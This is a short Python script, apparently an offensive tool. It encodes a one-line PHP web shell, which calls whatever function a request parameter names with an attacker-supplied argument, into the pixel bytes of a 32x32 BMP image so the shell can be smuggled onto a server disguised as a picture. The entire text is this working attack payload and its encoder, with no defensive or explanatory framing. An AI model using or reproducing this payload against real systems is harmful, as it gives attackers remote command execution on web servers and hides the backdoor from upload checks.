payload = "<?php $_REQUEST['0']($_REQUEST['1']); ?>"
payload += " "*(3-(len(payload)%3)%3) # Multiple of 3 ! Pad with space
chunk = ""
PXSIZE = int(len(payload)/3)

for i in range(0,len(payload),3): # Chunk BMP : B V R A, B V R A
   chunk += str(ord(payload[i+2])) # Letter 3
   chunk += ","
   chunk += str(ord(payload[i+1])) # Letter 2
   chunk += ","
   chunk += str(ord(payload[i])) # Letter 1
   chunk += ",255," # A
px = "0,0,0,255,"*((32*32)-PXSIZE) # PAD for a 32*32 image
px = px[:-1]
l = chunk+px
print '['+l+']'